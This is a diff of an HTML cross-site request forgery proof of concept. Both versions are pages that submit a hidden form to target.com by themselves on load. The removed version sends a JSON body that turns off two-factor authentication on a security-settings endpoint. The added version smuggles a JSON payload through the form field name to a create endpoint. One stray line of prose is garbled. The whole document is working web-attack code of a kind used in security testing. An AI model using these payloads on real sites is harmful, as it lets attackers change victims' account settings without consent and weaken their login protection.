@@ -6,28 +6,26 @@ multipart/form-data
 
 
 
-<!-- 1 -->
-<!DOCTYPE html>
+<!-- 1 --> Sometimes it just because the ORIGIN
 <html>
 <head>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-<script>
-$(document).ready(function() {
-    // Dynamically update the value of the hidden input
-    $("#z").val(JSON.stringify({ "2fa_enabled": false,"fakeparam":"');
-    
-    // Automatically submit the form when the page loads
-    $("#f").submit();
-});
-</script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script>
+    $( document ).ready(function() {
+        $("#z").attr("name",'{"data":{"combinedAnswerText":{"text":"testerrrrr"},"question":"again-tester"},"fakeparam":"');
+        $("#f").submit();
+    });
+    </script>
 </head>
 <body>
-<form id="f" enctype="text/plain" action="https://target.com/api/settings/security" method="post">
-    <input id="z" type="hidden" name="data" value='test"}'> 
-    <input type="submit" value="send">
-</form>
+    <form id="f" ENCTYPE="multipart/form-data" action="https://target.com/api/v1/create" method="post">
+        <input id="z" type="hidden" name='test' value='test"}'> 
+        <input type="submit" value="send">
+    </form>
 </body>
 </html>
+
+
 
 
 
